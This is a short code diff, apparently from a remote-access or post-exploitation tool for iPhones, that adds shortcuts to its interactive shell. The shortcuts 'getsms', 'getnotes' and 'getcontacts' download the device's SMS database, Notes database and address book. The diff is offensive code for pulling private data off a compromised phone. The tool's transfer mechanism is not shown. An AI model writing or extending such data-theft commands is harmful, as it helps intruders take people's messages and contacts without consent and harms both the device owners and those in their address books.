@@ -101,6 +101,11 @@ class ESShell:
     
     def interact(self,session,server,multisession=0):
         self.h.strinfo("type \"help\" for commands")
+        iosshortcuts = {
+            "getsms":"download /var/mobile/Library/SMS/sms.db",
+            "getnotes":"download /var/mobile/Library/Notes/notes.sqlite",
+            "getcontacts":"download /var/mobile/Library/AddressBook/AddressBook.sqlitedb"
+        }
         while 1:
             try:
                 command = raw_input(session.name)
